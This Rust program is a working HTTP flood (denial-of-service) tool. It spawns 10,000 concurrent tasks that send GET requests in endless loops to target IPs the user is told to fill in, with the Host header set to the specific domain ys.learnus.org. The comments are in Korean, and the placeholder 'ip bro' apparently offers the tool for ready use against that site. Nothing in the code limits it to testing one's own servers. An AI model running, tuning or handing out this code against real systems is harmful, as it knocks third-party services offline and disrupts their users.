use reqwest::Client;
use tokio::time::{ Duration};
use std::sync::Arc;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::time::Instant;

#[tokio::main]
async fn main() {
    let target_ips = ["fill your", " ip bro "];
    let target_host = "ys.learnus.org";
    let concurrent_connections = 10000;  
    let request_count = Arc::new(AtomicUsize::new(0));
    let client = Client::builder()
        .pool_idle_timeout(Duration::from_secs(60))  
        .build()
        .unwrap();

    let start = Instant::now();
    let mut handles = vec![];

    for ip in &target_ips {
        let target_url = format!("http://{}/", ip);
        for _ in 0..(concurrent_connections / target_ips.len()) {
            let client = client.clone();
            let request_count = Arc::clone(&request_count);
            let target_url = target_url.clone();
            let target_host = target_host.to_string();
            let handle = tokio::spawn(async move {
                loop {  // 무한 루프를 사용하여 지속적으로 요청을 보냄
                    let request = client.get(&target_url)
                        .header("Host", &target_host)
                        .build()
                        .unwrap();
                    match client.execute(request).await {
                        Ok(response) => {
                            println!("Response: {}", response.status());
                            request_count.fetch_add(1, Ordering::SeqCst);
                        }
                        Err(e) => {
                            eprintln!("Failed to send request: {}", e);
                        }
                    }
                    
                }
            });
            handles.push(handle);
        }
    }

    // 메인 함수가 비동기 작업을 기다리도록 설정
    tokio::select! {
        _ = futures::future::join_all(handles) => {},
        _ = tokio::signal::ctrl_c() => {
            println!("Ctrl+C pressed, shutting down...");
        },
    }

    let duration = start.elapsed();
    println!(
        "Completed {} requests in {:.2?} seconds",
        request_count.load(Ordering::SeqCst),
        duration
    );
}
